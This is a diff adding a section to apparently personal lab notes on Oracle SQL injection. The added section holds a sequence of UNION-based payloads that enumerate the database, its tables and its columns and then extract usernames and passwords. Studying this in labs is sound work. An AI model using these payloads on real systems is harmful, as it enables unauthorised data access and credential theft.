@@ -109,6 +109,31 @@ information_schema=databaseName
 
 ![image](https://user-images.githubusercontent.com/37367596/192010124-561016c4-f865-469f-9c8d-6f0a388e86b1.png)
 
+
+ **Equivalent to information schema on Oracle**
+ 
+You can list tables by querying all_tables : SELECT * FROM all_tables
+
+And you can list columns by querying  all_tab_columns  :  SELECT * FROM  all_tab_columns WHERE  table_name = 'USERS‘
+
+1. Use the following payload to retrieve the list of database:
+
+ 	 ' UNION SELECT SYS.DATABASE_NAME,NULL FROM DUAL--
+
+2. Use the following payload to retrieve the list of tables in the database:
+
+ 	 ‘ UNION SELECT table_name, NULL FROM all_tables--
+
+3.Use the following payload (replacing the table name) to retrieve the details of the columns in the table
+
+  	'UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name ='USER$'—
+
+4. To find information of username and password
+
+	‘ UNION SELECT username_jovsyx, password_abwqcw FROM users_uvlvoo– 
+![image](https://user-images.githubusercontent.com/37367596/192018303-8d02a8de-68eb-4b8f-9128-696824edfe9a.png)
+
+
 	
 	
 
